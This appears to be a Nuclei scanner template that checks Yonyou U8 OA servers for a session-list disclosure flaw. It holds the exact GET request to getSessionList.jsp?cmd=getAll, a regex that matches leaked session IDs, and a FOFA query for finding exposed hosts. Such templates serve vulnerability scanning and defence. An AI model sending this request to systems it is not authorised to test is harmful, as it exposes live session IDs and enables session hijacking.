id: yonyou-u8-getSessionList-disclosure
info:
  name: 用友 U8 OA 协同工作系统 getSessionList.jsp - disclosure
  author: leadlife
  severity: high
  description: 用友 U8 OA getSessionList.jsp 敏感信息泄漏漏洞
  reference: 
    - https://github.com/Threekiii/Awesome-POC/blob/master/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E7%94%A8%E5%8F%8B%20U8%20OA%20getSessionList.jsp%20%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E.md
  metadata:
    verified: true
    fofa-query: title="用友U8-OA"
  tags: yonyou,disclosure,oa,u8

http:
  - raw:
      - |
        GET /yyoa/ext/https/getSessionList.jsp?cmd=getAll HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - '\b[A-F0-9]{32}\b'

      - type: status
        status:
          - 200